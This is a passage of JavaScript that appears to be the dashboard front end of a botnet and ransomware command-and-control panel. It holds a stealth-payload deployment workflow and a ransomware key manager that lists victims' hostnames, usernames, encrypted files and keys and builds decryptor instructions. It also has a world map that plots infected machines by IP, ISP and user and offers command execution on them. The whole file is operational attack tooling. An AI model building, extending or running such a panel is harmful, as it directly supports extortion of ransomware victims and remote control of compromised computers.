    if (testBtn) {
        testBtn.disabled = true;
    }
    
    // Reset form
    document.getElementById('selected-payload-name').textContent = 'None selected';
    updateDeployButton();
    
    logConsole('info', '� Stealth workflow reset');
}

function updateDeployButton() {
    const deployBtn = document.getElementById('deploy-btn');
    const targetBotName = document.getElementById('target-bot-name');
    
    if (deployBtn) {
        deployBtn.disabled = !selectedBot || !stealthPayloadGenerated;
    }
    
    if (targetBotName) {
        targetBotName.textContent = selectedBot || 'None selected';
    }
}

// Update the existing updateBotDisplays function
function updateBotDisplays() {
    const displays = [
        'selected-bot-display',
        'selected-bot-display-files', 
        'selected-bot-display-payloads',
        'selected-bot-display-stealth'
    ];
    
    displays.forEach(id => {
        const element = document.getElementById(id);
        if (element) {
            element.textContent = selectedBot || 'No bot selected';
        }
    });
    
    updateDeployButton();
}

// Legacy function for backward compatibility
function generateEvadedPayload() {
    generateStealthPayload();
}

// Ransomware Keys Management
async function refreshRansomKeys() {
    try {
        logConsole('info', '🔑 Fetching ransomware encryption keys...');
        
        const response = await fetch(`${API_BASE}/get_ransom_keys`);
        const data = await response.json();
        
        // Update stats
        document.getElementById('stat-total-victims').textContent = data.total || 0;
        document.getElementById('stat-total-encrypted').textContent = data.total_encrypted_files || 0;
        document.getElementById('stat-stored-keys').textContent = data.total || 0;
        
        // Display keys
        const container = document.getElementById('ransom-keys-container');
        
        if (!data.keys || data.keys.length === 0) {
            container.innerHTML = `
                <div class="empty-state">
                    <span class="empty-icon">🔒</span>
                    <p>No ransomware encryption keys found</p>
                    <small>Keys will appear here when ransomware executes successfully</small>
                </div>
            `;
            logConsole('info', 'No ransomware keys found');
            return;
        }
        
        // Build keys display
        let html = '<div class="ransom-keys-grid">';
        
        data.keys.forEach(key => {
            const timestamp = new Date(key.timestamp).toLocaleString();
            const filesPreview = key.encrypted_files.slice(0, 3).join('<br>');
            const moreFiles = key.encrypted_files_count > 3 ? 
                `<br><small>... and ${key.encrypted_files_count - 3} more files</small>` : '';
            
            html += `
                <div class="ransom-key-card">
                    <div class="ransom-key-header">
                        <div class="ransom-victim-id">🔐 ${key.victim_id}</div>
                        <div class="ransom-timestamp">${timestamp}</div>
                    </div>
                    <div class="ransom-key-body">
                        <div class="ransom-info-row">
                            <span class="ransom-label">🖥️ Hostname:</span>
                            <span class="ransom-value">${key.hostname}</span>
                        </div>
                        <div class="ransom-info-row">
                            <span class="ransom-label">👤 Username:</span>
                            <span class="ransom-value">${key.username}</span>
                        </div>
                        <div class="ransom-info-row">
                            <span class="ransom-label">📁 Files Encrypted:</span>
                            <span class="ransom-value">${key.encrypted_files_count}</span>
                        </div>
                        <div class="ransom-files-preview">
                            <strong>Encrypted Files:</strong><br>
                            <div class="file-list">${filesPreview}${moreFiles}</div>
                        </div>
                        <div class="ransom-key-display">
                            <strong>🔑 Encryption Key:</strong><br>
                            <code class="key-value">${key.encryption_key.substring(0, 60)}...</code>
                            <button onclick="copyKey('${key.encryption_key}')" class="btn btn-sm">📋 Copy Key</button>
                        </div>
                    </div>
                    <div class="ransom-key-footer">
                        <button onclick="downloadKey('${key.victim_id}')" class="btn btn-primary">💾 Download Key File</button>
                        <button onclick="viewAllFiles('${key.victim_id}')" class="btn btn-secondary">📄 View All Files</button>
                        <button onclick="generateDecryptScript('${key.victim_id}')" class="btn btn-success">🔓 Generate Decryptor</button>
                    </div>
                </div>
            `;
        });
        
        html += '</div>';
        container.innerHTML = html;
        
        logConsole('success', `🔑 Loaded ${data.total} ransomware key(s)`);
        
    } catch (error) {
        logConsole('error', `Failed to fetch ransomware keys: ${error.message}`);
        console.error('Error fetching ransom keys:', error);
    }
}

function copyKey(key) {
    navigator.clipboard.writeText(key).then(() => {
        logConsole('success', '🔑 Encryption key copied to clipboard');
        showNotification('Encryption key copied!', 'success');
    }).catch(err => {
        logConsole('error', `Failed to copy key: ${err.message}`);
    });
}

function downloadKey(victimId) {
    // Create download for the key file
    const url = `${API_BASE}/ransom_keys/${victimId}.key`;
    const a = document.createElement('a');
    a.href = url;
    a.download = `${victimId}.key`;
    a.click();
    logConsole('success', `📥 Downloading key file for ${victimId}`);
}

async function viewAllFiles(victimId) {
    try {
        const response = await fetch(`${API_BASE}/get_ransom_keys`);
        const data = await response.json();
        const victim = data.keys.find(k => k.victim_id === victimId);
        
        if (!victim) {
            logConsole('error', 'Victim not found');
            return;
        }
        
        // Create modal or alert with all files
        const filesList = victim.encrypted_files.join('\n');
        const modal = confirm(`Encrypted Files for ${victimId}:\n\n${filesList}\n\nCopy to clipboard?`);
        
        if (modal) {
            navigator.clipboard.writeText(filesList);
            logConsole('success', '📋 File list copied to clipboard');
        }
        
    } catch (error) {
        logConsole('error', `Failed to view files: ${error.message}`);
    }
}

function generateDecryptScript(victimId) {
    const pythonScript = `#!/usr/bin/env python3
# Decryption script for victim: ${victimId}

python decrypt_files.py --key ransom_keys/${victimId}.key --restore-wallpaper --remove-note
`;

    const powershellScript = `# Decryption script for victim: ${victimId}

.\\decrypt_files.ps1 -KeyFile "ransom_keys\\${victimId}.key" -RestoreWallpaper -RemoveNote
`;

    const instructions = `DECRYPTION INSTRUCTIONS
======================

Victim ID: ${victimId}

PYTHON (Cross-Platform):
${pythonScript}

POWERSHELL (Windows):
${powershellScript}

Steps:
1. Copy decrypt_files.py (or .ps1) and ${victimId}.key to victim system
2. Run the appropriate decryption command above
3. All files will be decrypted and .deadsec extension removed
4. Wallpaper will be restored and ransom note removed
`;

    // Copy to clipboard
    navigator.clipboard.writeText(instructions).then(() => {
        alert(instructions);
        logConsole('success', `🔓 Decryption instructions generated for ${victimId}`);
    });
}

function showNotification(message, type = 'info') {
    // Simple notification (can be enhanced with a toast library)
    const colors = {
        success: '#00ff41',
        error: '#ff0040',
        info: '#00d4ff'
    };
    
    console.log(`%c${message}`, `color: ${colors[type]}; font-weight: bold;`);
}

// ============================================================================
// BOT MAP FUNCTIONS
// ============================================================================

let worldMap = null;
let markerClusterGroup = null;
let botMarkers = {};
let heatmapEnabled = false;

function initBotMap() {
    // Check if Leaflet is loaded
    if (typeof L === 'undefined') {
        console.error('Leaflet.js not loaded');
        return;
    }

    // Initialize map centered on world view
    worldMap = L.map('world-map', {
        zoomControl: true,
        attributionControl: false
    }).setView([20, 0], 2);

    // Dark themed tile layer (CartoDB Dark Matter)
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
        maxZoom: 19,
        minZoom: 2
    }).addTo(worldMap);

    // Initialize marker cluster group
    markerClusterGroup = L.markerClusterGroup({
        spiderfyOnMaxZoom: true,
        showCoverageOnHover: false,
        zoomToBoundsOnClick: true,
        iconCreateFunction: function(cluster) {
            const count = cluster.getChildCount();
            let size = 'small';
            if (count >= 10) size = 'large';
            else if (count >= 5) size = 'medium';
            
            return L.divIcon({
                html: `<div class="cluster-marker cluster-${size}"><span>${count}</span></div>`,
                className: 'marker-cluster-custom',
                iconSize: L.point(40, 40)
            });
        }
    });
    
    worldMap.addLayer(markerClusterGroup);

    // Load initial bot locations
    refreshBotMap();
    
    logConsole('success', '🗺️ Bot map initialized');
}

function refreshBotMap() {
    if (!worldMap) {
        initBotMap();
        return;
    }

    logConsole('info', '🗺️ Refreshing bot map...');

    fetch(`${API_BASE}/api/bot_locations`)
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                updateBotMap(data.locations);
                updateMapStats(data.locations);
                updateLocationList(data.locations);
                logConsole('success', `🗺️ Map updated: ${data.count} bots located`);
            } else {
                logConsole('error', '🗺️ Failed to fetch bot locations');
            }
        })
        .catch(error => {
            logConsole('error', `🗺️ Map refresh error: ${error.message}`);
        });
}

function updateBotMap(locations) {
    // Clear existing markers
    markerClusterGroup.clearLayers();
    botMarkers = {};

    locations.forEach(bot => {
        // Skip invalid coordinates
        if (!bot.lat || !bot.lon || (bot.lat === 0 && bot.lon === 0)) {
            return;
        }

        // Create custom marker icon
        const markerIcon = L.divIcon({
            className: 'bot-marker',
            html: `
                <div class="bot-marker-pin ${bot.status}" title="${bot.bot_id}">
                    <div class="bot-marker-pulse"></div>
                    <div class="bot-marker-icon">🤖</div>
                </div>
            `,
            iconSize: [30, 30],
            iconAnchor: [15, 30],
            popupAnchor: [0, -30]
        });

        // Create marker
        const marker = L.marker([bot.lat, bot.lon], { icon: markerIcon });

        // Create detailed popup
        const popupContent = `
            <div class="bot-popup">
                <div class="bot-popup-header">
                    <strong>🤖 ${bot.bot_id}</strong>
                    <span class="bot-popup-status ${bot.status}">${bot.status.toUpperCase()}</span>
                </div>
                <div class="bot-popup-info">
                    <div class="info-row">
                        <span class="info-label">📍 Location:</span>
                        <span class="info-value">${bot.city}, ${bot.country}</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">🌐 IP Address:</span>
                        <span class="info-value">${bot.ip}</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">🌍 Region:</span>
                        <span class="info-value">${bot.region}</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">📡 ISP:</span>
                        <span class="info-value">${bot.isp}</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">⏰ Timezone:</span>
                        <span class="info-value">${bot.timezone}</span>
                    </div>
                    <div class="info-row">
                        <span class="info-label">💻 User:</span>
                        <span class="info-value">${bot.username}</span>
                    </div>
                </div>
                <div class="bot-popup-actions">
                    <button onclick="selectBotFromMap('${bot.bot_id}')" class="btn-small btn-primary">
                        [SELECT BOT]
                    </button>
                    <button onclick="execCommandOnBot('${bot.bot_id}')" class="btn-small btn-success">
                        [EXECUTE]
                    </button>
                </div>
            </div>
        `;

        marker.bindPopup(popupContent, {
            maxWidth: 300,
            className: 'custom-popup'
        });

        // Add marker to cluster group
        markerClusterGroup.addLayer(marker);
        botMarkers[bot.bot_id] = marker;
    });

    logConsole('info', `🗺️ ${locations.length} markers added to map`);
}

function updateMapStats(locations) {
    // Total bots
    document.getElementById('map-stat-total').textContent = locations.length;

    // Unique countries
    const countries = new Set(locations.map(bot => bot.country));
    document.getElementById('map-stat-countries').textContent = countries.size;

    // Online bots
    const onlineBots = locations.filter(bot => bot.status === 'online').length;
    document.getElementById('map-stat-online').textContent = onlineBots;

    // Global spread (percentage of all countries)
    const totalCountries = 195; // Approximate number of countries
    const spreadPercentage = Math.round((countries.size / totalCountries) * 100);
    document.getElementById('map-stat-spread').textContent = `${spreadPercentage}%`;
}

function updateLocationList(locations) {
    const container = document.getElementById('bots-by-location');
    
    if (locations.length === 0) {
        container.innerHTML = `
            <div class="empty-state">
                <span class="empty-icon">🗺️</span>
                <p>No bot location data available</p>
                <small>Bots will appear on the map when connected</small>
            </div>
        `;
        return;
    }

    // Group bots by country
    const botsByCountry = {};
    locations.forEach(bot => {
        if (!botsByCountry[bot.country]) {
            botsByCountry[bot.country] = [];
        }
        botsByCountry[bot.country].push(bot);
    });

    // Sort countries by bot count
    const sortedCountries = Object.entries(botsByCountry)
        .sort((a, b) => b[1].length - a[1].length);

    container.innerHTML = sortedCountries.map(([country, bots]) => `
        <div class="location-card">
            <div class="location-header">
                <span class="location-flag">${getCountryFlag(bots[0].countryCode)}</span>
                <span class="location-name">${country}</span>
                <span class="location-count">${bots.length} bot${bots.length > 1 ? 's' : ''}</span>
            </div>
            <div class="location-bots">
                ${bots.slice(0, 3).map(bot => `
                    <div class="location-bot-item" onclick="selectBotFromMap('${bot.bot_id}')">
                        🤖 ${bot.bot_id} - ${bot.city}
                    </div>
                `).join('')}
                ${bots.length > 3 ? `<div class="location-more">+${bots.length - 3} more...</div>` : ''}
            </div>
        </div>
    `).join('');
}

function getCountryFlag(countryCode) {
    if (!countryCode || countryCode === 'XX') return '🏴';
    const codePoints = countryCode
        .toUpperCase()
        .split('')
        .map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

function selectBotFromMap(botId) {
    selectBot(botId);
    switchPage('commands');
    logConsole('info', `🎯 Selected bot from map: ${botId}`);
}

function execCommandOnBot(botId) {
    selectBot(botId);
    switchPage('commands');
    logConsole('info', `⚡ Ready to execute command on bot: ${botId}`);
}

function centerMap() {
    if (worldMap) {
        worldMap.setView([20, 0], 2);
        logConsole('info', '🗺️ Map view centered');
    }
}

function toggleHeatmap() {
    heatmapEnabled = !heatmapEnabled;
    const button = document.getElementById('heatmap-toggle');
    
    if (heatmapEnabled) {
        button.textContent = '[MARKER MODE]';
        button.classList.add('active');
        logConsole('info', '🔥 Heatmap mode enabled');
        // Heatmap functionality can be added with leaflet-heat plugin if needed
    } else {
        button.textContent = '[HEATMAP MODE]';
        button.classList.remove('active');
        logConsole('info', '📍 Marker mode enabled');
    }
}

// Initialize map when bot-map page is shown
document.addEventListener('DOMContentLoaded', function() {
    // Initialize map when switching to map page
    const originalSwitchPage = window.switchPage;
    window.switchPage = function(pageName) {
        originalSwitchPage(pageName);
        if (pageName === 'bot-map' && !worldMap) {
            setTimeout(initBotMap, 100);
        }
    };
});

